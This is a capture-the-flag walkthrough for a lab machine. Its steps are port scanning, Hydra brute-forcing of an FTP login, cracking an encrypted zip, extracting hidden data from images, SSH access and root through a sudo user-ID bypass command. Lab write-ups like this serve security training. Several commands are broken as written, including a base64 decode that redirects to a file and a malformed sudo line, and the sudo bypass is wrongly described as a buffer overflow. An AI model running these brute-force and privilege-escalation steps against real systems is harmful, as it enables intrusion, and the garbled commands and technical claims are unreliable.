SUDO-AGENT
Ip machine 10.10.8.46

First of all run the shell (/bin/bash) and we must do nmap ports

	nmap -sV -p- 10.10.8.46

It lists 3 open ports: 21(FTP), 22(SSH), 80(HTTP), after connecting to the site http://10.10.8.46
after load the page there is a hint to modify the User-agent camp, so open burpsuite.

	burpsuite

Run proxy server, open chromium and paste the http://10.10.8.46 after that we turn on the interceptor and we
intercept the packet, change the User-agent:C and forward.
the site will redirect to another page with an hint of the user in the FTP port.

So we have the name but no the password, we should bruteforce the password, and the tool for this quest
it will be Hydra and the command will be:

	       |-> /tag to insert a single user/
	       |
	hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.8.46 ftp

the following command it will send several requestes to the FTP port in order to bruteforce the password, the 
password is crystal.

In the shell we connect to the ftp:

	ftp 10.10.8.46
	USER: chris
	PASS: crystal
	ls -a
	get cutie.pnh
	get cutie-alien.jpg   (With get we download the file on the server)
	get //.txt

after downloading everything we see what are this file so we run the command exiftool:

	exiftool cutie.png

it seems that on this image there is something inside , so we use this:

	binwalk -b cutie.pnh -e

inside there will be a zip file  8702.zi but it's  encrypted, with the command:

	zip2john > zip.hash (we take the hash) john zip.hash and we recieve Alien

so we must unzip the folder and insert the password:

	file 8702.zip -> libzip version 1.5 -> search on google for unzip the folder -> 7z x 8702.zip -> passwd alien

Inside the folder there is a txt ToagentR.txt with inside a passwd like (QxjlTux) it is a base64 so we go must
change the base64 in ascii with the following command:

	echo 'QxJlTux' > base64 -d = Area51 

now we use this password for the passphrase fo the cutie.png with this command:

	steghide --extract -sf cutie.png

it will give us a txt with the passwd for the ssh, the password would be hackerrules!

	SSH james@10.10.8.46

Now we're inside we must do priviliege escalation.

	sudo -V -> for the versione 1.81.04 and we search the exploit.

online there is the following command for the exploitation:

	sudo -u /#$((0xFFFFFFFF)) /bin/bash  (it's a bufferoverflow)

we gain the root acces and we find the flag.txt
